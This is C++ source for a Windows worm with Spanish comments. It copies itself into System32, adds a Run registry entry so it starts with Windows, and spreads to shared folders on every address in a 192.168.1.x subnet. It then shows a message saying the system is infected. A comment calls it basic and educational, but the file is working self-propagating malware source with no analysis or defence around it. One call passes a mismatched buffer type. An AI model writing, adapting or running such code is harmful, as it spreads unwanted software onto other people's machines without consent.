#include <windows.h>
#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <shlobj.h>
#pragma comment(lib, "Ws2_32.lib")

void copySelf(const char* destPath) {
    char currentPath[MAX_PATH];
    GetModuleFileName(NULL, currentPath, MAX_PATH); // Obtener la ruta del archivo actual (el worm)
    CopyFile(currentPath, destPath, FALSE);         // Copiar el worm a la nueva ubicación
}

void infectSharedFolders() {
    char networkPath[MAX_PATH];
    // Simula el descubrimiento de recursos compartidos en red
    // Puedes hacerlo más avanzado buscando recursos SMB (esto es básico para fines educativos)
    for (int i = 1; i <= 255; i++) {
        snprintf(networkPath, MAX_PATH, "\\\\192.168.1.%d\\shared\\worm.exe", i); // Cambia IP según tu red
        copySelf(networkPath); // Copiar el worm a cada carpeta compartida
    }
}

void copyToSystemFolder() {
    char systemPath[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_SYSTEM, NULL, 0, systemPath); // Obtener la ruta de System32
    strcat(systemPath, "\\worm.exe");
    copySelf(systemPath); // Copiarse a sí mismo a System32
}

void addToStartup() {
    HKEY hKey;
    const char* regPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    const char* valueName = "System Worm";
    char filePath[MAX_PATH];
    GetModuleFileName(NULL, filePath, MAX_PATH); // Obtener el nombre del archivo actual

    // Agregar la entrada al registro
    RegOpenKey(HKEY_CURRENT_USER, regPath, &hKey);
    RegSetValueEx(hKey, valueName, 0, REG_SZ, (const BYTE*)filePath, strlen(filePath) + 1);
    RegCloseKey(hKey);
}

void payload() {
    MessageBox(NULL, "Tu sistema ha sido infectado por un worm", "Infección", MB_OK | MB_ICONWARNING);
}

int main() {
    copyToSystemFolder();
    addToStartup();
    infectSharedFolders();
    payload(); // Ejecutar la carga útil
    return 0;
}
